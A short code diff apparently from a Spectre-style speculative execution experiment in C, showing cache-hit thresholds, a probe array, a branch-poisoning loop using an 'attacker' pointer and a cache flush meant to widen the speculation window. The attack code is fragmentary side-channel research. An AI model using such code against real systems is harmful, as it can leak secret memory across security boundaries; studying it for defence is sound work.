@@ -15,11 +15,6 @@
 #define CACHE_HIT_THRESHOLD 100
 #define CACHE_HIT_PREFETCH_THRESHOLD 150
 
-typedef struct user_t {
-	void (*func)(int); // a pointer to a function that takes in an int as a parameter
-	int val;
-} user_t;
-
 uint8_t probe_array[ARRAY_SIZE * PAGE_SIZE + DELTA];
 uint8_t temp = 0;
 int size = 10;
@@ -61,7 +56,7 @@ int main(int argc, char* argv[]) {
 	// poison the branch for the first NUM_ITER-1 iterations, then on the final iteration, call victim
 	user_t* user = &attacker;
 	for(int iter=0; iter<NUM_ITER; iter++) {
-		_mm_clflush(&user->func);
+		_mm_clflush(user->func); // increase speculation window
 		//for(int n=0; n<50; n++) {
 		//	if(user->val > 0) { // According to Google Project Zero, this would help??
 		//	}
